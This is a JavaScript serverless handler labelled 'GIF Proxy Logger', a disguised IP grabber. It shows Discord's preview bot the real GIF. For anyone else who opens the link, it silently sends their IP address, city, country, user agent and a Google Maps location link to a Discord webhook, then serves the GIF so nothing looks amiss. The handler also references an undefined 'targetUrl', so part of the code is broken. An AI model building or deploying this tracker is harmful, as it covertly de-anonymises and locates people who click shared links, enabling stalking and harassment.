export default async function handler(req, res) {
  const { id } = req.query;
  const userAgent = req.headers['user-agent'] || '';
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  const spamFiles = ['favicon.ico', 'favicon.png', 'robots.txt', 'sitemap.xml'];
  if (spamFiles.includes(id) || userAgent.includes('vercel-favicon')) {
    return res.status(204).end(); 
  }

  const isDiscordBot = userAgent.includes('Discordbot');
  if (isDiscordBot) {
    return serveImage(id, res);
  }

  if (process.env.DISCORD_WEBHOOK_URL) {
    const country = req.headers['x-vercel-ip-country'] || 'Unknown';
    const city = req.headers['x-vercel-ip-city'] || 'Unknown';
    const region = req.headers['x-vercel-ip-country-region'] || 'Unknown';

    const mapSearch = encodeURIComponent(`${city}, ${region}, ${country}`);
    const mapImageUrl = `https://opengraph.githubassets.com/1/${id}?location=${mapSearch}`; 

    fetch(process.env.DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: "🎯 A hit has arrived!",
          color: 0x2ECC71,
          timestamp: new Date(),
          footer: { text: "GIF Proxy Logger v2.1 | https://github.com/dreamyfx" },
          fields: [
            { name: "🔑 ID", value: `\`${id}\``, inline: true },
            { name: "🌍 Location", value: `**${city}**, ${country}`, inline: true },
            { name: "📡 IP", value: `\`${ip}\``, inline: true },
            { name: "🔗 Maps", value: `[Open in Google Maps](https://www.google.com/maps/search/?api=1&query=${mapSearch})`, inline: true },
            { name: "📂 GIF", value: `[Original Source](${targetUrl})`, inline: true },
            { name: "🖥️ Device", value: `\`\`\`${userAgent.substring(0, 100)}\`\`\`` }
          ],
          thumbnail: { url: targetUrl },
          image: { 
            url: `https://api.screenshotmachine.com/?key=FREE&url=https://www.google.com/maps/search/${mapSearch}&dimension=640x320` 
          }
        }]
      })
    }).catch(() => {});
  }

  return serveImage(id, res);
}

async function serveImage(id, res) {
  const baseUrl = process.env.FIREBASE_DB_URL;
  const cleanBase = baseUrl.endsWith('/') ? baseUrl.slice(0, -1) : baseUrl;
  const fbUrl = `${cleanBase}/shortenedurls/${id}.json`;

  try {
    const fbRequest = await fetch(fbUrl);
    const targetUrl = await fbRequest.json();

    if (!targetUrl) {
      return res.status(404).send("GIF ID not found.");
    }

    const imageResponse = await fetch(targetUrl);
    const buffer = await imageResponse.arrayBuffer();

    res.setHeader("Content-Type", "image/gif");
    res.setHeader("Cache-Control", "public, max-age=3600");
    res.send(Buffer.from(buffer));
  } catch (error) {
    res.status(500).send("Error");
  }
}
